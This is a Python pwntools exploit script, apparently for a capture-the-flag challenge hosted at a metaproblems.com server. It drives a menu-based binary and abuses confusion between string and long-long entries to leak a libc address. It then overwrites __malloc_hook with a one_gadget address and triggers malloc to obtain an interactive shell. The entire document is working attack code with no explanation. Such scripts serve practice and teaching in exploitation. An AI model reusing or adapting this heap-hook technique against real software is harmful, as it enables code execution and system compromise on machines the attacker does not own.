#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

exe = ELF('./chall.patched')
libc = ELF('./libc.so.6')

host, port = "host.cg21.metaproblems.com", "3150"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

'''
1. String
2. Integer
3. Long Long
4. Character
'''
def createS(size,data):
  p.sendlineafter('Exit\n', '1')
  p.sendlineafter('Character\n', '1')
  p.sendlineafter('to be\n', str(size))
  p.sendlineafter('data\n', data)

def createL(val):
  p.sendlineafter('Exit\n', '1')
  p.sendlineafter('Character\n', '3')
  p.sendlineafter('value:\n', str(val))

def editL(idx,data):
  p.sendlineafter('Exit\n', '3')
  p.sendlineafter(' modify?\n', str(idx))
  p.sendlineafter('Character\n', '3')
  p.sendlineafter('value:\n', data)

def editS(idx,size,data):
  p.sendlineafter('Exit\n', '3')
  p.sendlineafter(' modify?\n', str(idx))
  p.sendlineafter('Character\n', '1')
  p.sendlineafter('to be\n', str(size))
  p.sendlineafter('data\n', data)

def display():
  p.sendlineafter('Exit\n', '2')


createS(140000, 'A')
editL(0,'-')
display()
leak = int(p.recvuntil('\n',drop=True),10)
libc.address = leak + 0x22ff0
print('libc base = '+hex(libc.address))
onegadgets = one_gadget('libc.so.6', libc.address)

editL(0, str(libc.symbols['__malloc_hook']))
editS(0,10, p64(onegadgets[1]))

p.sendlineafter('Exit\n', '3')
p.sendlineafter(' modify?\n', '0')
p.sendlineafter('Character\n', '1')
p.sendlineafter('to be\n', '150000')

p.interactive()

